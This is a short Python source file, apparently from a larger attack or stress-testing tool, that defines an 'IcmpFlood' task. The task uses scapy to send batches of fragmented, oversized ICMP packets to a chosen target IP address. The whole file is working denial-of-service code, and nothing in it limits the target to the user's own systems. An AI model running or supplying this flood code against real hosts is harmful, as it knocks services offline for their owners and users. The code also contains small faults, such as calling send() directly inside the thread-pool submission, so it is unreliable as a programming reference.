from lib.Task import Task
from scapy.all import *
from lib.ThreadPool import ThreadPool
import math
class IcmpFlood(Task):
    def __init__(self, id,progress_callback):
        super(IcmpFlood,self).__init__(id,progress_callback)
    def doTask(self,**kwargs):
        no_of_packets = kwargs.get('no_of_packets', None)
        target_ip = kwargs.get('target_ip', None)
        packet_per = 10
        no_of_loops = math.ceil(no_of_packets//packet_per)+1
        for i in range(no_of_loops):
            self.progress += 100/no_of_loops
            try:
                future  = ThreadPool.executor.submit(send(fragment(IP(dst=target_ip) / ICMP()  / ("X"*60000))*packet_per),"")
            except Exception as e:
                print(e)
            finally:                
                self.progressUpdateCallBack()
        self.progress = 100 # Complete
        #! Avoid .999999993121312321
        self.progressUpdateCallBack()
# x = IcmpFlood("213")
# x.runTask()
